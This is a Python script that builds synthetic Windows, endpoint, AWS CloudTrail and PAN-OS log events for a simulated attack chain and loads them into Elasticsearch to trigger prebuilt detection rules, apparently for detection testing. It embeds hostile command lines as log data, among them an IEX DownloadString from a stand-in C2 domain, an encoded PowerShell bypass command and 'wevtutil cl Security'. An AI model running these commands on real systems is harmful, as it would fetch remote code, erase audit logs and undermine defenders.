#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
elastic_attack_sim_v2.py

End-to-end generator for a deterministic (non-ML) Elastic Security
attack chain that is GUARANTEED to line up with specific **prebuilt rule**
queries — provided those rules are enabled and pointed at your Agent
data streams.

This script:
  • Emits Windows Security (4698, 4688, 1102), PowerShell (4104),
    Endpoint events (process + API), AWS CloudTrail (CreateAccessKey, AttachUserPolicy),
    and a bit of PAN-OS context.
  • Sets the precise fields those rules look for (e.g., winlog.channel,
    event.action values, script block contents with base64+compression or PE header).
  • Indexes to logs-<dataset>-<namespace> (data stream names).

───────────────────────────────────────────────────────────────────────────────
SETUP

1) Create a .env next to this script:

   ELASTIC_CLOUD_ID=YOUR_CLOUD_ID
   ELASTIC_API_KEY=YOUR_API_KEY

2) (Optional but recommended) Pre-create index templates/data streams once
   in Kibana → Dev Tools (adjust namespace if not "simulation"):

   PUT _index_template/ds-windows-template
   {
     "index_patterns": [
       "logs-windows.security-*",
       "logs-windows.powershell-*",
       "logs-windows.sysmon_operational-*",
       "logs-endpoint.events.process-*",
       "logs-endpoint.events.api-*",
       "logs-aws.cloudtrail-*",
       "logs-panw.panos-*"
     ],
     "data_stream": {},
     "priority": 700
   }

   PUT _data_stream/logs-windows.security-simulation
   PUT _data_stream/logs-windows.powershell-simulation
   PUT _data_stream/logs-windows.sysmon_operational-simulation
   PUT _data_stream/logs-endpoint.events.process-simulation
   PUT _data_stream/logs-endpoint.events.api-simulation
   PUT _data_stream/logs-aws.cloudtrail-simulation
   PUT _data_stream/logs-panw.panos-simulation

3) Install deps:
   pip install "elasticsearch>=8.12.0" python-dateutil python-dotenv

4) Run:
   python elastic_attack_sim_v2.py --count 1000 --namespace simulation -v

   Flags:
     --count        total events (default 1000)
     --rate         events/sec pacing (0 = unlimited; default 200)
     --namespace    data_stream.namespace (default simulation)
     --batch-size   bulk chunk size (default 500)
     --seed         RNG seed (default 42)
     --dry-run      print 10 example docs and exit
     -v/--verbose   debug logging

───────────────────────────────────────────────────────────────────────────────
TARGETED PREBUILT RULES (exact titles — no ML)
  Windows
   • A scheduled task was created
   • Windows Event Logs Cleared
   • Suspicious Windows Powershell Arguments
   • PowerShell Suspicious Payload Encoded and Compressed
   • Suspicious Portable Executable Encoded in Powershell Script
   • Suspicious Lsass Process Access   (via endpoint.events.api OpenProcess)

  AWS CloudTrail
   • AWS IAM User Created Access Keys For Another User
   • AWS IAM AdministratorAccess Policy Attached to User
"""

from __future__ import annotations

import argparse
import json
import logging
import os
import random
import sys
import time
from datetime import datetime, timedelta, timezone
from typing import Any, Dict, Iterable, Iterator, List, Tuple

from dateutil import tz
from dotenv import load_dotenv
from elasticsearch import Elasticsearch, helpers

# ──────────────────────────────────────────────────────────────────────────────
# Config / Entities
# ──────────────────────────────────────────────────────────────────────────────

WINDOWS_HOST = "WIN-FILESRV01"
WINDOWS_IP = "10.0.10.15"
WINDOWS_USER = "temp.admin"

LINUX_HOST = "ip-10-0-59-13.ec2.internal"
LINUX_IP = "10.0.59.13"
LINUX_USER = "ec2-user"

ATTACKER_IP = "203.0.113.50"
C2_DOMAIN = "cdn-security-updates.example"

AWS_ACCOUNT = "123456789012"
AWS_REGION = "us-east-1"
AWS_IAM_USER = "legacy-app-svc"          # actor
AWS_TARGET_USER = "compromised-admin"    # target of CreateAccessKey

# Data sets (Elastic Agent)
DS = {
    "win_sec": "windows.security",
    "win_ps": "windows.powershell",
    "win_sysmon": "windows.sysmon_operational",
    "ep_proc": "endpoint.events.process",
    "ep_api": "endpoint.events.api",
    "aws_ct": "aws.cloudtrail",
    "panw": "panw.panos",
}

TIMELINE_HOURS = 2

# Example encoded/compressed markers for 4104 rules:
COMPRESSED_B64_MARKER = "[System.IO.Compression.GzipStream]"
FROM_BASE64_MARKER = "FromBase64String('H4sIAAAAAAAA"  # dummy prefix for gzip b64
PE_HEADER_B64_PREFIX = "TVqQAAMAAAAEAAAA"  # base64 of PE header "MZ..."

# ──────────────────────────────────────────────────────────────────────────────
# Utilities
# ──────────────────────────────────────────────────────────────────────────────

def now_utc() -> datetime:
    return datetime.now(timezone.utc).replace(microsecond=0)

def ts_iso(base: datetime, offset_minutes: int) -> str:
    return (base + timedelta(minutes=offset_minutes)).astimezone(timezone.utc).isoformat()

def with_ds(event: Dict[str, Any], dataset: str, namespace: str) -> Dict[str, Any]:
    event["data_stream"] = {"type": "logs", "dataset": dataset, "namespace": namespace}
    return event

def ensure_host_os_windows(event: Dict[str, Any]) -> None:
    event.setdefault("host", {})
    event["host"].setdefault("os", {})
    event["host"]["os"]["type"] = "windows"

def rand_port() -> int:
    return random.randint(49152, 65535)

# ──────────────────────────────────────────────────────────────────────────────
# Event Builders (crafted to match rule queries)
# ──────────────────────────────────────────────────────────────────────────────

def evt_win_task_created(ts: str, ns: str) -> Dict[str, Any]:
    # Matches: "A scheduled task was created"
    e = with_ds({
        "@timestamp": ts,
        "event": {"category": ["configuration"], "type": ["creation"], "action": "scheduled-task-created"},
        "winlog": {
            "event_id": 4698,
            "channel": "Security",
            "computer_name": WINDOWS_HOST,
            "event_data": {
                "TaskName": "\\Microsoft\\Windows\\UpdateCheck",
                "TaskContent": "<Task><Exec><Command>C:\\ProgramData\\svchost.exe</Command></Exec></Task>"
            },
        },
        "host": {"name": WINDOWS_HOST},
        "user": {"domain": "CORP", "name": WINDOWS_USER},
    }, DS["win_sec"], ns)
    ensure_host_os_windows(e)
    return e

def evt_win_logs_cleared(ts: str, ns: str) -> Dict[str, Any]:
    # Matches: "Windows Event Logs Cleared" (expects event.action == audit-log-cleared or "Log clear")
    e = with_ds({
        "@timestamp": ts,
        "event": {"category": ["process"], "type": ["change"], "action": "audit-log-cleared"},
        "winlog": {
            "event_id": 1102,
            "channel": "Security",
            "computer_name": WINDOWS_HOST,
            "provider_name": "Microsoft-Windows-Eventlog",
        },
        "host": {"name": WINDOWS_HOST},
        "user": {"domain": "CORP", "name": WINDOWS_USER},
        "process": {"name": "wevtutil.exe", "command_line": "wevtutil cl Security"},
    }, DS["win_sec"], ns)
    ensure_host_os_windows(e)
    return e

def evt_ps_encoded_args_4688(ts: str, ns: str) -> Dict[str, Any]:
    # Matches: "Suspicious Windows Powershell Arguments" via 4688 + -EncodedCommand
    e = with_ds({
        "@timestamp": ts,
        "event": {"category": ["process"], "type": ["start"], "code": "4688"},
        "winlog": {"event_id": 4688, "channel": "Security", "computer_name": WINDOWS_HOST},
        "process": {
            "name": "powershell.exe",
            "pid": 5124,
            "command_line": "powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQp",
        },
        "host": {"name": WINDOWS_HOST},
        "user": {"domain": "CORP", "name": WINDOWS_USER},
    }, DS["win_sec"], ns)
    ensure_host_os_windows(e)
    return e

def evt_ps_4104_download(ts: str, ns: str) -> Dict[str, Any]:
    # Contextual 4104 with IEX DownloadString (may match arguments rules when combined with 4688)
    e = with_ds({
        "@timestamp": ts,
        "event": {"category": ["process"], "type": ["start"], "code": "4104"},
        "winlog": {
            "event_id": 4104,
            "channel": "Microsoft-Windows-PowerShell/Operational",
            "computer_name": WINDOWS_HOST,
            "event_data": {},  # prevents ingest pipeline errors
        },
        "powershell": {
            "file": {"script_block_text": "IEX (New-Object Net.WebClient).DownloadString('http://cdn-security-updates.example/a.ps1')"}
        },
        "process": {"name": "powershell.exe", "pid": 5124},
        "host": {"name": WINDOWS_HOST},
        "user": {"domain": "CORP", "name": WINDOWS_USER},
    }, DS["win_ps"], ns)
    ensure_host_os_windows(e)
    return e

def evt_ps_4104_encoded_compressed(ts: str, ns: str) -> Dict[str, Any]:
    # Matches: "PowerShell Suspicious Payload Encoded and Compressed"
    sblock = f"{COMPRESSED_B64_MARKER} ... [Convert]::{FROM_BASE64_MARKER}...')"
    e = with_ds({
        "@timestamp": ts,
        "event": {"category": ["process"], "type": ["start"], "code": "4104"},
        "winlog": {
            "event_id": 4104,
            "channel": "Microsoft-Windows-PowerShell/Operational",
            "computer_name": WINDOWS_HOST,
            "event_data": {},
        },
        "powershell": {"file": {"script_block_text": sblock}},
        "process": {"name": "powershell.exe", "pid": 5124},
        "host": {"name": WINDOWS_HOST},
        "user": {"domain": "CORP", "name": WINDOWS_USER, "id": "S-1-5-21-1234567890-1234567890-1234567890-1001"},
    }, DS["win_ps"], ns)
    ensure_host_os_windows(e)
    return e

def evt_ps_4104_pe_header(ts: str, ns: str) -> Dict[str, Any]:
    # Matches: "Suspicious Portable Executable Encoded in Powershell Script" (TVqQ...)
    sblock = f"$b64='{PE_HEADER_B64_PREFIX}...'; $bin=[Convert]::FromBase64String($b64)"
    e = with_ds({
        "@timestamp": ts,
        "event": {"category": ["process"], "type": ["start"], "code": "4104"},
        "winlog": {
            "event_id": 4104,
            "channel": "Microsoft-Windows-PowerShell/Operational",
            "computer_name": WINDOWS_HOST,
            "event_data": {},
        },
        "powershell": {"file": {"script_block_text": sblock}},
        "process": {"name": "powershell.exe", "pid": 5124},
        "host": {"name": WINDOWS_HOST},
        "user": {"domain": "CORP", "name": WINDOWS_USER, "id": "S-1-5-21-1234567890-1234567890-1234567890-1001"},
    }, DS["win_ps"], ns)
    ensure_host_os_windows(e)
    return e

def evt_endpoint_proc_ps_start(ts: str, ns: str) -> Dict[str, Any]:
    # endpoint.events.process with suspicious arguments (many rules also look here)
    e = with_ds({
        "@timestamp": ts,
        "event": {"category": ["process"], "type": ["start"]},
        "host": {"name": WINDOWS_HOST, "ip": [WINDOWS_IP]},
        "process": {
            "name": "powershell.exe",
            "pid": 5124,
            "command_line": "powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand SQBFAFgA... ; IEX(New-Object Net.WebClient).DownloadString('http://cdn-security-updates.example/a.ps1')",
            "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "parent": {"name": "cmd.exe", "pid": 4512},
        },
        "user": {"domain": "CORP", "name": WINDOWS_USER},
    }, DS["ep_proc"], ns)
    ensure_host_os_windows(e)
    return e

def evt_endpoint_api_lsass_openprocess(ts: str, ns: str) -> Dict[str, Any]:
    # Matches: "Suspicious Lsass Process Access" (via endpoint.events.api OpenProcess → lsass.exe)
    e = with_ds({
        "@timestamp": ts,
        "event": {"category": ["api"], "type": ["access"]},
        "host": {"name": WINDOWS_HOST, "ip": [WINDOWS_IP]},
        "process": {
            "name": "powershell.exe",
            "pid": 5124,
            "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "Ext": {"api": {"name": "OpenProcess"}},
        },
        "Target": {"process": {"name": "lsass.exe", "pid": 668}},
        "user": {"domain": "CORP", "name": WINDOWS_USER},
    }, DS["ep_api"], ns)
    ensure_host_os_windows(e)
    return e

def evt_aws_create_access_key_cross_user(ts: str, ns: str) -> Dict[str, Any]:
    # Matches: AWS IAM User Created Access Keys For Another User
    e = with_ds({
        "@timestamp": ts,
        "event": {
            "category": ["iam"], "type": ["change"], "action": "CreateAccessKey",
            "outcome": "success", "provider": "iam.amazonaws.com"
        },
        "aws": {"cloudtrail": {
            "eventName": "CreateAccessKey",
            "eventSource": "iam.amazonaws.com",
            "userIdentity": {"type": "IAMUser", "userName": AWS_IAM_USER, "accountId": AWS_ACCOUNT},
            "requestParameters": {"userName": AWS_TARGET_USER},
            "responseElements": {"accessKey": {"status": "Active"}}
        }},
        "cloud": {"account": {"id": AWS_ACCOUNT}, "region": AWS_REGION, "provider": "aws"},
        "user": {"name": AWS_IAM_USER, "target": {"name": AWS_TARGET_USER}},
        "source": {"ip": ATTACKER_IP},
    }, DS["aws_ct"], ns)
    return e

def evt_aws_attach_admin_policy(ts: str, ns: str) -> Dict[str, Any]:
    # Matches: AWS IAM AdministratorAccess Policy Attached to User
    e = with_ds({
        "@timestamp": ts,
        "event": {"category": ["iam"], "type": ["change"], "action": "AttachUserPolicy", "outcome": "success"},
        "aws": {"cloudtrail": {
            "eventName": "AttachUserPolicy",
            "eventSource": "iam.amazonaws.com",
            "userIdentity": {"type": "IAMUser", "userName": AWS_IAM_USER, "accountId": AWS_ACCOUNT},
            "requestParameters": {
                "userName": AWS_IAM_USER,
                "policyArn": "arn:aws:iam::aws:policy/AdministratorAccess"
            }
        }},
        "cloud": {"account": {"id": AWS_ACCOUNT}, "region": AWS_REGION, "provider": "aws"},
        "user": {"name": AWS_IAM_USER},
    }, DS["aws_ct"], ns)
    return e

def evt_panw_allow(ts: str, ns: str, dst_ip: str, dst_port: int, domain: str | None = None) -> Dict[str, Any]:
    return with_ds({
        "@timestamp": ts,
        "event": {"category": ["network"], "type": ["connection", "allowed"], "action": "allow"},
        "panw": {"panos": {"action": "allow", "type": "TRAFFIC"}},
        "network": {"protocol": "tcp", "transport": "tcp"},
        "source": {"ip": WINDOWS_IP, "port": rand_port()},
        "destination": {"ip": dst_ip, "port": dst_port, **({"domain": domain} if domain else {})},
        "host": {"name": WINDOWS_HOST},
        "user": {"name": WINDOWS_USER},
    }, DS["panw"], ns)

# ──────────────────────────────────────────────────────────────────────────────
# Storyline generator
# ──────────────────────────────────────────────────────────────────────────────

def generate_events(total: int, seed: int, namespace: str) -> List[Dict[str, Any]]:
    random.seed(seed)
    end = now_utc()
    base = end - timedelta(hours=TIMELINE_HOURS)

    events: List[Dict[str, Any]] = []

    # Timeline anchors (minutes)
    t_initial = 5
    t_exec = 15
    t_persist = 25
    t_defev = 45
    t_cred = 55
    t_disc = 65
    t_c2 = 90
    t_aws = 95
    t_logs_clear = 52  # just before cred access

    # Initial access (PAN-OS allow to phishing CDN)
    events.append(evt_panw_allow(ts_iso(base, t_initial), namespace, "198.51.100.42", 443, "malicious-cdn.example"))

    # Execution & PowerShell
    events.append(evt_endpoint_proc_ps_start(ts_iso(base, t_exec), namespace))
    events.append(evt_ps_encoded_args_4688(ts_iso(base, t_exec), namespace))
    events.append(evt_ps_4104_download(ts_iso(base, t_exec), namespace))

    # Persistence — Scheduled task (4698)  ← Alert
    events.append(evt_win_task_created(ts_iso(base, t_persist), namespace))

    # Defense Evasion — Encoded & Compressed PS (4104)  ← Alert
    events.append(evt_ps_4104_encoded_compressed(ts_iso(base, t_defev), namespace))
    # Also PE header pattern (4104)  ← Alert
    events.append(evt_ps_4104_pe_header(ts_iso(base, t_defev + 1), namespace))

    # Windows Event Logs Cleared (1102)  ← Alert
    events.append(evt_win_logs_cleared(ts_iso(base, t_logs_clear), namespace))

    # Credential Access — LSASS via API (endpoint.events.api)  ← Alert
    events.append(evt_endpoint_api_lsass_openprocess(ts_iso(base, t_cred), namespace))

    # Discovery (simple net view via endpoint process — useful context)
    events.append(with_ds({
        "@timestamp": ts_iso(base, t_disc),
        "event": {"category": ["process"], "type": ["start"]},
        "host": {"name": WINDOWS_HOST, "ip": [WINDOWS_IP], "os": {"type": "windows"}},
        "process": {
            "name": "net.exe",
            "pid": 5688,
            "executable": "C:\\Windows\\System32\\net.exe",
            "command_line": 'net group "domain admins" /domain',
            "parent": {"name": "cmd.exe", "pid": 5124},
        },
        "user": {"domain": "CORP", "name": WINDOWS_USER},
    }, DS["ep_proc"], namespace))

    # C2 / Exfil (PAN-OS allow to attacker infra — context)
    events.append(evt_panw_allow(ts_iso(base, t_c2), namespace, ATTACKER_IP, 443, C2_DOMAIN))

    # AWS Priv-Esc / Persistence  ← Alerts
    events.append(evt_aws_create_access_key_cross_user(ts_iso(base, t_aws), namespace))
    events.append(evt_aws_attach_admin_policy(ts_iso(base, t_aws + 5), namespace))

    # Fill remaining with benign/process noise (not strictly necessary)
    need = max(0, total - len(events))
    for _ in range(need):
        when = ts_iso(base, random.randint(0, TIMELINE_HOURS * 60))
        # simple benign process
        events.append(with_ds({
            "@timestamp": when,
            "event": {"category": ["process"], "type": ["start"]},
            "host": {"name": WINDOWS_HOST, "ip": [WINDOWS_IP], "os": {"type": "windows"}},
            "process": {
                "name": random.choice(["chrome.exe","outlook.exe","excel.exe","teams.exe"]),
                "pid": random.randint(1000, 9999),
                "parent": {"name": "explorer.exe", "pid": 2288},
            },
            "user": {"domain": "CORP", "name": WINDOWS_USER},
        }, DS["ep_proc"], namespace))

    random.shuffle(events)
    return events[:total]

# ──────────────────────────────────────────────────────────────────────────────
# Ingestion helpers
# ──────────────────────────────────────────────────────────────────────────────

def to_bulk_actions(events: List[Dict[str, Any]]) -> Iterable[Dict[str, Any]]:
    for e in events:
        ds = e.get("data_stream", {})
        dataset = ds.get("dataset")
        namespace = ds.get("namespace")
        if not dataset or not namespace:
            continue
        yield {
            "_index": f"logs-{dataset}-{namespace}",
            "_op_type": "create",
            "_source": e,
        }

def ingest(client: Elasticsearch, events: List[Dict[str, Any]], batch_size: int, rate: float, logger: logging.Logger) -> Tuple[int, int]:
    total = len(events)
    ok = 0
    err = 0
    logger.info(f"Starting ingestion of {total} docs (batch_size={batch_size}, rate={rate}/s)")

    actions = to_bulk_actions(events)
    delay = (batch_size / rate) if rate > 0 else 0
    count_in_batch = 0

    try:
        for success, info in helpers.streaming_bulk(
            client,
            actions,
            chunk_size=batch_size,
            raise_on_error=False,
            raise_on_exception=False,
            max_retries=3,
            initial_backoff=1,
            request_timeout=60,
        ):
            if success:
                ok += 1
                count_in_batch += 1
            else:
                err += 1
                # print first few errors to help debugging
                if err <= 5:
                    try:
                        action, detail = next(iter(info.items()))
                        logger.error("Bulk item error: %s", json.dumps(detail, ensure_ascii=False))
                    except Exception:
                        logger.error("Bulk item error: %s", info)

            if delay and count_in_batch >= batch_size:
                time.sleep(delay)
                count_in_batch = 0

    except Exception as e:
        logger.exception("Bulk ingestion exception: %s", e)
        return ok, err + 1

    logger.info("Ingestion done: ok=%d err=%d", ok, err)
    return ok, err

# ──────────────────────────────────────────────────────────────────────────────
# Client / CLI
# ──────────────────────────────────────────────────────────────────────────────

def make_client(logger: logging.Logger) -> Elasticsearch:
    load_dotenv()
    cloud_id = os.getenv("ELASTIC_CLOUD_ID")
    api_key = os.getenv("ELASTIC_API_KEY")
    if not cloud_id or not api_key:
        logger.error("Missing ELASTIC_CLOUD_ID or ELASTIC_API_KEY (set them in .env)")
        sys.exit(1)

    client = Elasticsearch(cloud_id=cloud_id, api_key=api_key, request_timeout=30, retry_on_timeout=True)
    info = client.info()
    logger.info("Connected to Elasticsearch %s (cluster=%s)", info.get("version", {}).get("number"), info.get("cluster_name"))
    return client

def parse_args() -> argparse.Namespace:
    p = argparse.ArgumentParser(description="Deterministic Elastic Security attack-chain generator (non-ML)")
    p.add_argument("--count", type=int, default=1000)
    p.add_argument("--rate", type=float, default=200.0)
    p.add_argument("--namespace", type=str, default="simulation")
    p.add_argument("--batch-size", type=int, default=500)
    p.add_argument("--seed", type=int, default=42)
    p.add_argument("--dry-run", action="store_true")
    p.add_argument("-v", "--verbose", action="store_true")
    return p.parse_args()

def main() -> int:
    args = parse_args()
    logging.basicConfig(
        level=logging.DEBUG if args.verbose else logging.INFO,
        format="%(asctime)s %(levelname)s %(message)s",
    )
    logger = logging.getLogger("attack-sim")

    events = generate_events(args.count, args.seed, args.namespace)

    if args.dry_run:
        print("── Sample (10 docs) ─────────────────────────────────────────────")
        for doc in events[:10]:
            print(json.dumps(doc, indent=2))
        return 0

    client = make_client(logger)
    ok, err = ingest(client, events, args.batch_size, args.rate, logger)

    print("\n" + "=" * 66)
    print("INGESTION SUMMARY")
    print("=" * 66)
    print(f"Generated: {len(events)}")
    print(f"Indexed:   {ok}")
    print(f"Errors:    {err}")
    print(f"Namespace: {args.namespace}")
    print("=" * 66)
    print("\nVALIDATION QUERIES (Discover, last 2h)")
    print('  • Scheduled Task: data_stream.dataset:"windows.security" AND winlog.event_id:4698 AND event.action:"scheduled-task-created"')
    print('  • Logs Cleared:   data_stream.dataset:"windows.security" AND winlog.event_id:1102 AND event.action:("audit-log-cleared" or "Log clear")')
    print('  • PS Args:        (data_stream.dataset:"windows.security" AND winlog.event_id:4688 AND process.command_line:*EncodedCommand*) '
          'OR (data_stream.dataset:"endpoint.events.process" AND process.name:"powershell.exe" AND event.type:"start" AND process.command_line:(*EncodedCommand* OR *DownloadString*))')
    print('  • PS Enc+Comp:    data_stream.dataset:"windows.powershell" AND powershell.file.script_block_text:(FromBase64String AND (GzipStream OR DeflateStream))')
    print('  • PS PE in SB:    data_stream.dataset:"windows.powershell" AND powershell.file.script_block_text:"TVqQAAMAAAAEAAAA"')
    print('  • LSASS API:      data_stream.dataset:"endpoint.events.api" AND process.Ext.api.name:"OpenProcess" AND Target.process.name:"lsass.exe"')
    print('  • AWS Keys:       data_stream.dataset:"aws.cloudtrail" AND event.action:"CreateAccessKey"')
    print('  • AWS Admin:      data_stream.dataset:"aws.cloudtrail" AND event.action:"AttachUserPolicy" AND aws.cloudtrail.requestParameters.policyArn:*AdministratorAccess*')
    print()

    return 0 if err == 0 else 1

if __name__ == "__main__":
    sys.exit(main())
